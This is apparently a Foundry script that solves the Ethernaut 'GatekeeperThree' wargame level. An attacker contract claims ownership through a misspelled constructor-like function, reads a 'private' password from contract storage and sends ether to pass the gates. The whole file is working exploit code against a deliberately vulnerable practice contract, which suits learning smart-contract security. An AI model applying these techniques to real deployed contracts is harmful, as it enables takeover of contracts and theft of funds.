// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperThree.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    GatekeeperThree gatekeeperThreeInstance;

    constructor(address payable _address) {
        gatekeeperThreeInstance = GatekeeperThree(_address);
    }

    function attack(uint256 password) public {
        gatekeeperThreeInstance.construct0r();
        gatekeeperThreeInstance.getAllowance(uint256(password));
        gatekeeperThreeInstance.enter();
    }

    receive() external payable {
        require(msg.value > 0.0015 ether);
    }
}

contract GateKeeperThreeSolution is Script {
    GatekeeperThree public gatekeeperThree = GatekeeperThree(payable(0x4Fa12E6deFcf5a0D30C037494A020f2f95C3BC5b));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before entrant : ", gatekeeperThree.entrant());
        console.log("Before owner : ", gatekeeperThree.owner());

        AttackerContract attackerContract = new AttackerContract(payable(address(gatekeeperThree)));
        
        gatekeeperThree.createTrick();

        SimpleTrick simpleTrick = SimpleTrick(gatekeeperThree.trick());

        bytes32 passwordLow = vm.load(address(simpleTrick), bytes32(uint256(2)));

        payable(address(gatekeeperThree)).call{value: 0.0015 ether}("");

        attackerContract.attack(uint256(passwordLow));

        console.log("After allowEntrance : ", gatekeeperThree.allowEntrance());
        console.log("After entrant : ", gatekeeperThree.entrant());
        console.log("After owner : ", gatekeeperThree.owner());

        vm.stopBroadcast();
    }
}